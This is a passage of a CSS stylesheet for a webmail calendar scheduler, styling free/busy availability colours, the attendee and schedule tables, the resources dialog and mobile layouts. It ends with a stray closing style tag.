 .availability span.busy:before {
   color: #EC1313;
 }
 .availability span.tentative:before {
   color: #8383fc;
 }
 .availability span.out-of-office:before {
   color: #fbaa68;
 }
 .datetime .custom-switch {
   padding-left: 0.5rem;
 }
 .datetime .custom-switch label {
   line-height: 2;
   margin-top: 0.2rem;
 }
 .datetime input {
   width: 10em !important;
 }
 @media screen and (max-width: 420px) {
   .datetime input {
     width: 8em !important;
   }
   .datetime input + input {
     width: 6em !important;
   }
 }
 .calendar-scheduler .nav {
   align-items: center;
 }
 .calendar-scheduler .nav button:first-child {
   margin-right: 0.25rem;
 }
 .calendar-scheduler .nav > div {
   white-space: nowrap;
 }
 @media screen and (max-width: 420px) {
   .calendar-scheduler .nav button {
     padding-left: 0.5rem;
     padding-right: 0.5rem;
   }
 }
 .calendar-scheduler .schedule-buttons .prev-slot:before {
   content: "\f053";
 }
 .calendar-scheduler .schedule-buttons .next-slot:after {
   content: "\f054";
   display: inline-block;
   float: none;
   margin-right: 0;
 }
 .calendar-scheduler .schedule-options {
   flex: 1;
   margin-left: 1rem;
 }
 html.layout-phone .calendar-scheduler .schedule-options {
   order: 100;
   margin-left: 0;
 }
 .calendar-scheduler .schedule-nav {
   flex: 1;
   margin-left: 0.3rem;
   text-align: right;
 }
 .calendar-scheduler .schedule-nav button {
   line-height: 1.8;
 }
 .calendar-scheduler .schedule-range {
   width: 60%;
   margin-top: 2rem;
 }
 html.layout-phone .calendar-scheduler .schedule-range {
   margin: 0;
 }
 .calendar-scheduler .schedule-legend .attendee {
   margin-right: 0.5rem;
 }
 .calendar-scheduler .attendees-list {
   position: relative;
 }
 .calendar-scheduler .attendees-list a.attendee-role-toggle {
   position: absolute;
   left: 0;
   display: inline-block;
   width: 1em;
   cursor: pointer;
 }
 .calendar-scheduler .attendees-list div.attendee {
   border-top: 1px solid #f1f3f4;
   line-height: 1.7rem;
   height: 1.8rem;
 }
 .calendar-scheduler .attendees-list .attendee {
   white-space: nowrap;
 }
 .calendar-scheduler .attendees-list .attendee.spacer {
   height: 10px;
 }
 .calendar-scheduler .attendees-list .attendee.loading:before {
   -webkit-animation: spinner-border 1.5s infinite linear;
   animation: spinner-border 1.5s infinite linear;
   content: "\f1ce";
   font-weight: 900;
 }
 .calendar-scheduler .attendees-list .attendee.total {
   font-weight: bold;
 }
 .calendar-scheduler .attendees-list .attendee.total:before,
 .calendar-scheduler .attendees-list .attendee.spacer:before {
   display: none;
 }
 .calendar-scheduler .schedule-table {
   table-layout: fixed;
 }
 .calendar-scheduler .schedule-table th {
   border-top: 0;
 }
 .calendar-scheduler .schedule-table td.attendees {
   width: 25%;
   overflow: hidden;
   border-top: 0;
 }
 html.layout-phone .calendar-scheduler .schedule-table td.attendees {
   width: 35%;
 }
 .calendar-scheduler .schedule-table td.attendees .attendees-list {
   border-bottom: 1px solid #d4dbde;
 }
 .calendar-scheduler .schedule-table td.times {
   width: auto;
   border-top: 0;
 }
 .calendar-scheduler .schedule-table td.times table {
   margin: 0;
 }
 .calendar-scheduler .schedule-table td.times td {
   height: 1.8rem;
   border-top: 1px solid #f1f3f4;
   white-space: nowrap;
 }
 .calendar-scheduler .schedule-table div.scroll {
   position: relative;
   overflow: auto;
 }
 .calendar-scheduler .schedule-table .timesheader {
   height: 1.4rem;
   border-top: 1px solid #d4dbde;
 }
 .calendar-scheduler .schedule-table .boxtitle {
   margin: 0;
   padding: 0;
   font-size: 1rem;
   font-weight: bold;
   padding-top: 0.5rem;
   line-height: 2;
 }
 .calendar-scheduler .schedule-table td {
   padding: 4px;
 }
 .calendar-scheduler .schedule-table tbody td {
   padding: 0;
 }
 .calendar-scheduler .schedule-table tbody td div {
   height: 100%;
 }
 .calendar-scheduler .schedule-table tr.spacer td {
   padding: 0;
   height: 10px;
 }
 .calendar-scheduler .schedule-table tr.dates th[colspan="1"] {
   min-width: 48px;
   max-width: 48px;
   text-align: center;
   font-size: 0.7rem;
   line-height: 2.9;
 }
 .calendar-scheduler .schedule-table tr.times td {
   cursor: pointer;
   min-width: 48px;
   max-width: 48px;
   font-size: 0.7rem;
   text-align: center;
   color: #0099cc;
   height: 1.4rem;
   padding: 0 0.1rem;
   vertical-align: middle;
   border-top: 1px solid #d4dbde;
   border-left: 1px solid #f1f3f4;
 }
 .calendar-scheduler .schedule-table .fbcontent td {
   border-left: 1px solid #f1f3f4;
 }
 .calendar-scheduler .schedule-table .fbcontent:last-child td {
   border-bottom: 1px solid #d4dbde;
 }
 .calendar-scheduler .schedule-table div.unknown {
   background-color: #bbb;
 }
 .calendar-scheduler .schedule-table div.free {
   background-color: #41b849;
 }
 .calendar-scheduler .schedule-table div.busy {
   background-color: #EC1313;
 }
 .calendar-scheduler .schedule-table div.tentative {
   background-color: #8383fc;
 }
 .calendar-scheduler .schedule-table div.out-of-office {
   background-color: #fbaa68;
 }
 .calendar-scheduler .schedule-table div.all-busy,
 .calendar-scheduler .schedule-table div.all-tentative,
 .calendar-scheduler .schedule-table div.all-out-of-office {
   overflow: hidden;
 }
 .calendar-scheduler .schedule-table div.all-busy span,
 .calendar-scheduler .schedule-table div.all-tentative span,
 .calendar-scheduler .schedule-table div.all-out-of-office span {
   display: block;
   width: 300%;
   height: 300%;
   border: 1px solid #fff;
   background: #bd0f0f;
   transform: rotate(42deg) translate(2%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w10 span,
 .calendar-scheduler .schedule-table div.all-tentative.w10 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w10 span {
   display: none;
 }
 .calendar-scheduler .schedule-table div.all-busy.w20 span,
 .calendar-scheduler .schedule-table div.all-tentative.w20 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w20 span,
 .calendar-scheduler .schedule-table div.all-busy.w25 span,
 .calendar-scheduler .schedule-table div.all-tentative.w25 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w25 span {
   transform: rotate(17deg) translate(-9%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w30 span,
 .calendar-scheduler .schedule-table div.all-tentative.w30 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w30 span {
   transform: rotate(28deg) translate(-7%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w33 span,
 .calendar-scheduler .schedule-table div.all-tentative.w33 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w33 span {
   transform: rotate(32deg) translate(-5%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w40 span,
 .calendar-scheduler .schedule-table div.all-tentative.w40 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w40 span {
   transform: rotate(36deg) translate(-3%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w60 span,
 .calendar-scheduler .schedule-table div.all-tentative.w60 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w60 span {
   transform: rotate(48deg) translate(6%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w67 span,
 .calendar-scheduler .schedule-table div.all-tentative.w67 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w67 span {
   transform: rotate(52deg) translate(9%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w70 span,
 .calendar-scheduler .schedule-table div.all-tentative.w70 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w70 span,
 .calendar-scheduler .schedule-table div.all-busy.w75 span,
 .calendar-scheduler .schedule-table div.all-tentative.w75 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w75 span {
   transform: rotate(55deg) translate(12%, 30%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w80 span,
 .calendar-scheduler .schedule-table div.all-tentative.w80 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w80 span {
   transform: rotate(56deg) translate(13%, 30%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w90 span,
 .calendar-scheduler .schedule-table div.all-tentative.w90 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w90 span {
   transform: rotate(59deg) translate(16%, 30%);
 }
 .calendar-scheduler .schedule-table div.all-busy.w100 span,
 .calendar-scheduler .schedule-table div.all-tentative.w100 span,
 .calendar-scheduler .schedule-table div.all-out-of-office.w100 span {
   transform: rotate(62deg) translate(19%, 30%);
 }
 .calendar-scheduler .schedule-table div.all-tentative span {
   background: #5151fb;
 }
 .calendar-scheduler .schedule-table div.all-out-of-office span {
   background: #fa8e36;
 }
 #schedule-event-time {
   position: absolute;
   border-radius: 0.3rem;
   cursor: move;
   border: 2px solid #444;
   background-color: rgba(0, 0, 0, 0.3);
 }
 .resources-dialog .resource-selection {
   flex: 4;
   min-width: 300px;
 }
 .resources-dialog .resource-content {
   flex: 10;
   margin-left: 1em;
 }
 .resources-dialog .listing li.resource > a {
   color: #2c363a;
 }
 .resources-dialog .listing li.resource > a:before {
   content: "\f1b2";
 }
 .resources-dialog .slot-nav {
   display: none;
 }
 #resource-availability {
   height: 100%;
 }
 #resource-availability .fc {
   height: 100%;
   overflow: hidden;
   position: relative;
   border-bottom: 1px solid #ddd;
 }
 #resource-availability .fc-view {
   border-left: 1px solid #ddd;
 }
 #resource-availability .fc-header-toolbar {
   height: 0;
 }
 .standalone-invitebox {
   margin: 0 auto;
   max-width: 500px;
   width: 95%;
   display: flex;
   flex-direction: column;
   top: 15vh;
   position: relative;
 }
 .standalone-invitebox #logo {
   max-height: 90px;
 }
 .standalone-invitebox .invitebox {
   margin-top: 3em !important;
 }
 @media screen and (min-width: 769px) {
   .searchbar a.button.date {
     display: none;
   }
 }
 #rcmfd_alarmvalue {
   max-width: 80px;
 }
 @media screen and (max-width: 768px) {
   #agendaoptions {
     padding-top: 0.5rem;
   }
   .calendar-scheduler .schedule-range {
     width: 100%;
   }
   #layout-sidebar .calendar-datepicker {
     display: none;
   }
   .resources-dialog .resource-content {
     display: none;
     margin: 0;
   }
   .resources-dialog .resource-content ul {
     margin: 1em 1em 0 1em;
   }
   #resource-availability {
     margin: 0 1em;
   }
 }
 body.task-calendar .header-title {
   position: relative;
 }
 body.task-calendar .header-title .tz {
   position: absolute;
   bottom: 0;
   left: 0;
   width: 100%;
   line-height: 2;
   font-size: 0.8rem;
   font-weight: normal;
   color: #737677;
 }


 


</style>


